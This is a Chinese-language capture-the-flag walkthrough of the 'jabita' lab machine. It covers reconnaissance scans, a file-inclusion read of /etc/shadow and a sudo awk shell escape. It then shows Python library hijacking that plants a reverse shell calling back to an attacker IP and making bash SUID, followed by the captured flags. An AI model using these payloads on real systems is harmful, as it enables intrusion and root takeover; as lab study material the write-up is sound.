
|   |   |   |
|---|---|---|
|jabita|easy|文件包含利用、shadow爆破、sudo-awk 提权、python库劫持提权、python反弹shell|

# 主机发现
```C
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -i eth0 -r 192.168.44.139/24
```

# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.147 
```
22,  80

# 目录扫描
```c
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.44.147 -x php,html.txt.png -e
```

```c
http://192.168.44.147/building   
在这个页面随便点个home
发现这个页面可能存在文件包含http://192.168.44.147/building/index.php?page=home.php
初次尝试得到结果
http://192.168.44.147/building/index.php?page=/etc/shadow


jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7::: 
```
# john爆破




# 提权

```c
jack@jabita:~$ sudo -l
    (jaba : jaba) NOPASSWD: /usr/bin/awk 
```

然后去这个网站搜索相关命令getshell，，，awk
[GTFOBins](https://gtfobins.github.io/)

```c
sudo awk 'BEGIN {system("/bin/sh")}'
```

```c
jack@jabita:~$ sudo -u jaba  /usr/bin/awk 'BEGIN {system("/bin/sh")}'
$ id
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)

$ script /dev/null -c bash
jaba@jabita:/home/jack$ sudo -l
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
```
查看这个文件为root 权限，该脚本导入了wild 模块，执行后调用first()方法，输出一个hello。
我们搜索该模块，查看模块内容如下
```c
jaba@jabita:/home/jack$ cat /usr/bin/clean.py 
import wild

wild.first()
jaba@jabita:/home/jack$ ls -all /usr/bin/clean.py 
-rw-r--r-- 1 root root 26 Sep  5  2022 /usr/bin/clean.py
jaba@jabita:/home/jack$ /usr/bin/python3 /usr/bin/clean.py
Hello
jaba@jabita:/home/jack$ find / -type f -name "wild.py" 2>/dev/null
/usr/lib/python3.10/wild.py
jaba@jabita:/home/jack$ cat /usr/lib/python3.10/wild.py
def first():
        print("Hello")
jaba@jabita:/home/jack$ ls -all /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
```
## python库劫持
我们对改文件具有修改的权限，因此可以尝试python库劫持进行提取
那么接下来我们可以使用python反弹一个shell,代码如下
```c
import os
def first():
	os.system("python3 -c \"import       os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.44.128',9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"")
```

```c
jaba@jabita:/home/jack$ sudo -u root /usr/bin/python3 /usr/bin/clean.py
```

实战中，如果机器不出网，我们可以修改该脚本的内容，让它可以使用 SUID 执行 bash。或者直接创建一个root权限的账号。

```c
import os
def first():	
	os.system("chmod u+s /bin/bash")
```

```c
find / -perm -u=s -type f 2>/dev/null


jaba@jabita:/home/jack$ bash -p
bash-5.1# whoami
root
```

```
bash-5.1# cat user.txt 
2e0942f09699435811c1be613cbc7a39
bash-5.1# cat root.txt 
f4bb4cce1d4ed06fc77ad84ccf70d3fe
```